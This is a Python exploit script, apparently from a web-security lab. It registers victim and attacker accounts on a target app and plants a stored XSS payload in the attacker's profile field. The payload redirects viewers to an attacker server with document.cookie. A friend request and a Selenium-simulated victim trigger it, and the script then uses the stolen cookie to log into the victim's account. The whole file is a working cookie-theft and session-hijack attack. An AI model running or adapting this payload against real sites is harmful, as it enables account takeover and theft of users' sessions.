#!/usr/bin/env python

import requests, sys
from interface import *
from selenium import webdriver
from bs4 import BeautifulSoup

if not (3 == len(sys.argv)):
    print(f"Usage: {__file__} server_url attackerServer_url")
    sys.exit(-1)

url = sys.argv[1]
external_url = sys.argv[2]

session = requests.Session()
reset_app(session, url)

victim_username = 'victim'
victim_password = '1234'
attacker_username = 'atacker'
attacker_password = '1234'
store_cookie_url = external_url + '/store_cookie'
last_cookie_url = external_url + '/last_cookie'

register(session, url, username=victim_username, password=victim_password)
logout(session, url)
register(session, url, username=attacker_username, password=attacker_password)

# Update about field in profile
payload = f"""
<script>
    window.location=
    `{store_cookie_url}?cookie=${{document.cookie}}`
</script>
"""
r = update_profile(session, url, password=attacker_password, about=payload)

# Check if we succeeded updating the profile
assert f"Succesfully updated user {attacker_username} profile" in r.text

# Send friend request to victim
r = add_friend(session, url, username=victim_username)

# Check if we succeeded sending a friend request to victim
assert f"Succesfully created friend request to {victim_username}" in r.text

logout(session, url)

login(session, url, username=victim_username, password=victim_password)
cookie_dict = session.cookies.get_dict()
logout(session, url)

# Simulate victim opening browser (to execute XSS)
driver = webdriver.Chrome()
driver.get(url)
for key in cookie_dict:
    driver.add_cookie({
        "name": key,
        "value": cookie_dict[key]
    })
driver.get(url + "/pending_requests")

# Get cookie from victim
r = session.get(last_cookie_url)
cookie = r.text.split("=")

# Try to enter in the victim's account
cookies = {cookie[0]:cookie[1]}
r = session.get(url + "/profile", cookies=cookies)

soup = BeautifulSoup(r.text, 'html.parser')
profile = soup.find_all("li")[4].text

username = profile.split("(")[1].split(")")[0]

assert username == victim_username
print("[+] Successfully logged in the victim's account")

session.close()
